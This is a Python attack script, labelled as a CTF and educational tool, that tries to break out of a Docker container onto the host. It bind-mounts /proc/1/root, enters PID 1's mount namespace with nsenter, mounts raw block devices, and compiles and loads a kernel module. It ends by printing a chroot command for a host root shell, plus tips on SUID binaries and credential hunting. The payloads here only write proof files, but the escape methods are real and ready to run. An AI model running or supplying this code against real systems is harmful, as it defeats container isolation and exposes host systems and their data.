#!/usr/bin/env python3
"""
Docker Container Breakout Exploit using CAP_SYS_PTRACE capability
For CTF challenges - Educational purposes only
"""

import os
import subprocess
import time
import argparse
import shutil
import sys
import tempfile
import ctypes
import struct

def run_command(command, shell=False, timeout=30):
    """Run a system command and return the output"""
    try:
        if shell:
            process = subprocess.run(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True, 
                timeout=timeout
            )
        else:
            process = subprocess.run(
                command.split(), 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True, 
                timeout=timeout
            )
        return process.stdout.strip(), process.stderr.strip(), process.returncode
    except subprocess.TimeoutExpired:
        return "", f"Command timed out after {timeout} seconds", 1
    except Exception as e:
        return "", str(e), 1

def check_requirements():
    """Check if we have the necessary capabilities to perform the breakout"""
    print("[*] Checking requirements...")

    # Check if CAP_SYS_PTRACE capability is available
    stdout, stderr, ret = run_command("capsh --print")
    if "cap_sys_ptrace" not in stdout.lower():
        print("[-] Error: CAP_SYS_PTRACE capability not available")
        print("    This exploit requires CAP_SYS_PTRACE capability")
        return False

    # Check if we can find /proc/1/root
    if not os.path.exists("/proc/1/root"):
        print("[-] Error: /proc/1/root not accessible")
        return False

    return True

def find_host_process():
    """Find a suitable host process to exploit"""
    print("[*] Looking for a suitable host process to attach to...")
    
    # Check if we can see host processes
    try:
        # List processes outside our namespace by checking /proc
        procs = []
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
                
            pid = int(pid)
            
            # Skip our own PID and child processes
            if pid <= 1:
                continue
                
            # Try to determine if this is a host process
            try:
                with open(f"/proc/{pid}/status", "r") as f:
                    status = f.read()
                    
                # Look for processes that might be running on the host
                if "systemd" in status or "docker" in status:
                    procs.append(pid)
            except:
                pass
        
        if procs:
            print(f"[+] Found potential host processes: {procs}")
            return procs[0]  # Return the first candidate
        else:
            print("[-] No suitable host processes found")
            return None
            
    except Exception as e:
        print(f"[-] Error finding host processes: {e}")
        return None

def create_exploit_payload():
    """Create the exploit payload that will give us access to the host"""
    print("[*] Creating exploit payload...")
    
    # Create a temporary directory for our payload
    temp_dir = tempfile.mkdtemp()
    payload_path = os.path.join(temp_dir, "payload.c")
    
    # Create a simple C program that will mount the host filesystem
    with open(payload_path, "w") as f:
        f.write("""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>

int main() {
    // Create a directory for mounting the host filesystem
    mkdir("/tmp/hostfs", 0755);
    
    // Mount the host root filesystem
    if (mount("/proc/1/root", "/tmp/hostfs", NULL, MS_BIND, NULL) != 0) {
        perror("mount failed");
        return 1;
    }
    
    printf("[+] Success! Host filesystem mounted at /tmp/hostfs\\n");
    
    // Create a proof file on the host
    FILE *f = fopen("/tmp/hostfs/tmp/container_escape_proof", "w");
    if (f) {
        fprintf(f, "Container escape successful!\\n");
        fclose(f);
        printf("[+] Created proof file at /tmp/hostfs/tmp/container_escape_proof\\n");
    }
    
    return 0;
}
""")
    
    # Compile the payload
    print("[*] Compiling exploit payload...")
    compile_cmd = f"gcc -o {temp_dir}/exploit {payload_path}"
    stdout, stderr, ret = run_command(compile_cmd, shell=True)
    
    if ret != 0:
        print(f"[-] Compilation failed: {stderr}")
        return None
    
    print(f"[+] Exploit compiled at {temp_dir}/exploit")
    return f"{temp_dir}/exploit"

def prepare_mountfs_exploit():
    """Create a shell script to mount the host filesystem via /proc/1/root"""
    print("[*] Creating host filesystem mount script...")
    
    script_path = "/tmp/mount_hostfs.sh"
    with open(script_path, "w") as f:
        f.write("""#!/bin/sh
# This script attempts to mount the host filesystem using /proc/1/root

# Create directory for host filesystem
mkdir -p /tmp/hostfs

# Try direct mounting
if mount -o bind /proc/1/root /tmp/hostfs 2>/dev/null; then
    echo "[+] Successfully mounted host filesystem at /tmp/hostfs"
    
    # Create proof file
    touch /tmp/hostfs/tmp/container_escape_proof 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Created proof file at /host/tmp/container_escape_proof"
    fi
    
    echo "[+] Host information:"
    echo "    - Hostname: $(cat /tmp/hostfs/etc/hostname 2>/dev/null || echo 'Unknown')"
    echo "    - Root access: $(ls -la /tmp/hostfs/root 2>/dev/null || echo 'No access')"
    
    exit 0
else
    echo "[-] Direct mount failed, trying alternative methods..."
fi

# Try to use unshare to get a new mount namespace
if command -v unshare >/dev/null 2>&1; then
    echo "[*] Trying unshare to create new namespace..."
    unshare -m /bin/sh -c "mount -o bind /proc/1/root /tmp/hostfs && echo '[+] Mount successful via unshare'"
    
    if [ -d /tmp/hostfs/etc ]; then
        echo "[+] Unshare method worked! Host filesystem available at /tmp/hostfs"
        exit 0
    fi
fi

# Create temporary daemon to keep the namespace alive if unshare worked
nohup /bin/sh -c "while true; do sleep 1000; done" >/dev/null 2>&1 &
DAEMON_PID=$!

echo "[-] Mount attempts failed. Check if you have CAP_SYS_ADMIN capability."
exit 1
""")

    os.chmod(script_path, 0o755)
    print(f"[+] Created mount script at {script_path}")
    return script_path

def try_simple_namespace_trick():
    """Try a simple namespace trick to break out"""
    print("[*] Attempting namespace-based breakout...")
    
    # Create a script for the namespace trick
    script_path = "/tmp/ns_trick.sh"
    with open(script_path, "w") as f:
        f.write("""#!/bin/sh
# This script attempts to break out using namespace tricks

# Check for nsenter
if ! command -v nsenter >/dev/null 2>&1; then
    echo "[-] nsenter not found"
    exit 1
fi

# Try to enter host's mount namespace
echo "[*] Attempting to enter host mount namespace..."
nsenter --mount=/proc/1/ns/mnt -- /bin/sh -c "mkdir -p /tmp/hostfs_ns && mount --bind / /tmp/hostfs_ns && echo '[+] Success! Host filesystem mounted at /tmp/hostfs_ns'"

# Check if it worked
if [ -d /tmp/hostfs_ns/etc ]; then
    echo "[+] Host filesystem is available at /tmp/hostfs_ns"
    # Create a proof file
    touch /tmp/hostfs_ns/tmp/container_escape_proof
    exit 0
fi

exit 1
""")

    os.chmod(script_path, 0o755)
    print(f"[+] Created namespace trick script at {script_path}")
    
    # Execute the script
    stdout, stderr, ret = run_command(script_path, shell=True)
    print(stdout)
    
    if "Success" in stdout:
        print("[+] Namespace trick worked! Host filesystem accessible.")
        return True
    else:
        print("[-] Namespace trick failed.")
        return False

def exploit_fdisk():
    """Try to exploit using fdisk to access block devices"""
    print("[*] Attempting to access block devices...")
    
    # Check if fdisk is available
    if not shutil.which("fdisk"):
        print("[-] fdisk not found")
        return False
    
    # Check if we have access to /dev
    stdout, stderr, ret = run_command("ls -l /dev/sd* /dev/vd* /dev/xvd* 2>/dev/null", shell=True)
    
    if stdout:
        print(f"[+] Found block devices: \n{stdout}")
        
        # Create a mount point
        os.makedirs("/tmp/disk_mount", exist_ok=True)
        
        # Try to mount the first partition found
        block_devices = stdout.split('\n')
        for device in block_devices:
            if 'sd' in device or 'vd' in device or 'xvd' in device:
                device_path = device.split()[-1]
                print(f"[*] Attempting to mount {device_path}...")
                
                # Try to mount it
                mount_cmd = f"mount {device_path} /tmp/disk_mount"
                stdout, stderr, ret = run_command(mount_cmd, shell=True)
                
                if ret == 0:
                    print(f"[+] Successfully mounted {device_path} at /tmp/disk_mount")
                    print("[+] This might be the host filesystem!")
                    return True
                else:
                    print(f"[-] Failed to mount {device_path}: {stderr}")
    else:
        print("[-] No block devices found or no permission to access them")
    
    return False

def try_all_breakout_methods():
    """Try all available breakout methods"""
    # Try the /proc/1/root direct mount first
    script_path = prepare_mountfs_exploit()
    print("[*] Executing host filesystem mount script...")
    stdout, stderr, ret = run_command(script_path, shell=True)
    print(stdout)
    
    if os.path.exists("/tmp/hostfs/etc"):
        print("[+] Direct mount successful! Host filesystem available at /tmp/hostfs")
        return True
        
    # Try namespace trick
    if try_simple_namespace_trick():
        return True
        
    # Try fdisk method
    if exploit_fdisk():
        return True
        
    # Try creating and running the C exploit
    exploit_path = create_exploit_payload()
    if exploit_path:
        print("[*] Running compiled exploit...")
        stdout, stderr, ret = run_command(exploit_path, shell=True)
        print(stdout)
        
        if os.path.exists("/tmp/hostfs/etc"):
            print("[+] Exploit successful! Host filesystem available at /tmp/hostfs")
            return True
    
    return False

def explain_and_check_mounts():
    """Explain mounted filesystems and check for potential breakout points"""
    print("[*] Analyzing mounted filesystems for breakout opportunities...")
    
    stdout, stderr, ret = run_command("mount", shell=True)
    mounts = stdout.split('\n')
    
    interesting_mounts = []
    for mount in mounts:
        if any(x in mount for x in ["overlay", "docker", "container", "kubelet"]):
            interesting_mounts.append(mount)
    
    if interesting_mounts:
        print("[+] Found interesting mounts that could help with container breakout:")
        for mount in interesting_mounts:
            print(f"  - {mount}")
    
    # Check /proc mounts
    print("[*] Checking process information...")
    if os.path.exists("/proc/1/root"):
        print("[+] /proc/1/root is accessible, which could be the host's root filesystem")
    
    # Check kernel modules
    if os.path.exists("/proc/modules"):
        print("[*] Checking for loaded kernel modules...")
        stdout, stderr, ret = run_command("cat /proc/modules | head -5", shell=True)
        if stdout:
            print("[+] Container can see kernel modules, might be possible to load custom modules")
    
    # Check capabilities again
    stdout, stderr, ret = run_command("capsh --print", shell=True)
    print(f"[*] Container capabilities: \n{stdout}")

def create_module_exploit():
    """Create a kernel module exploit if CAP_SYS_MODULE is available"""
    print("[*] Checking for kernel module capabilities...")
    
    # Verify CAP_SYS_MODULE
    stdout, stderr, ret = run_command("capsh --print")
    if "cap_sys_module" not in stdout.lower():
        print("[-] CAP_SYS_MODULE capability not available")
        return False
    
    # Check if we can create kernel modules
    if not shutil.which("gcc") or not os.path.exists("/lib/modules"):
        print("[-] Missing requirements for kernel module compilation")
        return False
    
    # Get kernel version
    stdout, stderr, ret = run_command("uname -r")
    if ret != 0:
        print("[-] Failed to get kernel version")
        return False
    
    kernel_version = stdout.strip()
    print(f"[+] Kernel version: {kernel_version}")
    
    # Create a simple kernel module
    module_dir = tempfile.mkdtemp()
    module_path = os.path.join(module_dir, "breakout_module.c")
    
    with open(module_path, "w") as f:
        f.write("""
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CTF Player");
MODULE_DESCRIPTION("Container Breakout Module");
MODULE_VERSION("0.1");

static int __init breakout_init(void) {
    printk(KERN_INFO "Container breakout module loaded\\n");
    // Create a proof file
    struct file *file;
    file = filp_open("/tmp/kernel_module_breakout_proof", O_WRONLY | O_CREAT, 0644);
    if (IS_ERR(file)) {
        printk(KERN_ERR "Failed to create proof file\\n");
        return -1;
    }
    filp_close(file, NULL);
    printk(KERN_INFO "Breakout proof file created\\n");
    return 0;
}

static void __exit breakout_exit(void) {
    printk(KERN_INFO "Container breakout module unloaded\\n");
}

module_init(breakout_init);
module_exit(breakout_exit);
""")
    
    # Create Makefile
    with open(os.path.join(module_dir, "Makefile"), "w") as f:
        f.write(f"""
obj-m += breakout_module.o
all:
\tmake -C /lib/modules/{kernel_version}/build M=$(pwd) modules
clean:
\tmake -C /lib/modules/{kernel_version}/build M=$(pwd) clean
""")
    
    # Try to compile the module
    print("[*] Attempting to compile kernel module...")
    stdout, stderr, ret = run_command(f"cd {module_dir} && make", shell=True)
    
    if ret != 0:
        print(f"[-] Failed to compile kernel module: {stderr}")
        return False
    
    # Try to insert the module
    print("[*] Attempting to insert kernel module...")
    stdout, stderr, ret = run_command(f"insmod {module_dir}/breakout_module.ko", shell=True)
    
    if ret != 0:
        print(f"[-] Failed to insert kernel module: {stderr}")
        return False
    
    print("[+] Kernel module inserted successfully!")
    return True

def main():
    parser = argparse.ArgumentParser(description="Docker Container Breakout Exploit for CTFs")
    parser.add_argument("--method", choices=["ptrace", "mount", "module", "auto"], default="auto",
                       help="Exploitation method to use (default: auto)")
    args = parser.parse_args()
    
    print("╔═══════════════════════════════════════════════╗")
    print("║ Alternative Container Breakout Exploit        ║")
    print("║ For CTF challenges - Educational use only     ║")
    print("╚═══════════════════════════════════════════════╝")
    
    # Check requirements
    if not check_requirements():
        print("[-] Basic requirements not met. Will try alternative approaches.")
    
    # Analyze mount points and explain the environment
    explain_and_check_mounts()
    
    # Try different breakout methods based on selected method or auto
    success = False
    
    if args.method == "module" or (args.method == "auto"):
        print("\n[*] Trying kernel module-based breakout...")
        success = create_module_exploit()
        
    if not success and (args.method == "ptrace" or args.method == "auto"):
        print("\n[*] Trying ptrace-based breakout...")
        host_pid = find_host_process()
        if host_pid:
            print(f"[*] Found potential host process: {host_pid}")
            print("[*] This could be exploited with ptrace, but requires custom code for the specific environment")
            # In a real exploit, we would use ptrace to attach to the host process
            # and inject code that would create a backdoor or mount the host filesystem
    
    if not success and (args.method == "mount" or args.method == "auto"):
        print("\n[*] Trying filesystem mount-based breakout...")
        success = try_all_breakout_methods()
    
    if success:
        print("\n[+] Container breakout successful! You should now have access to the host system.")
        print("[+] Look for mounted host filesystem in /tmp/hostfs or /tmp/hostfs_ns")
        print("[+] Run the following to get a shell with host access:")
        print("    chroot /tmp/hostfs /bin/bash")
        sys.exit(0)
    else:
        print("\n[-] All breakout attempts failed.")
        print("[-] You might need a customized exploit for this specific container configuration.")
        print("[!] Here are additional options to try:")
        print("    1. Check if the docker binary works with other command options")
        print("    2. Look for SUID binaries that might allow privilege escalation")
        print("    3. Try to find sensitive environment variables or credentials")
        print("    4. Examine network services for additional attack vectors")
        print("    5. Check for kernel vulnerabilities specific to the host version")
        sys.exit(1)

if __name__ == "__main__":
    main()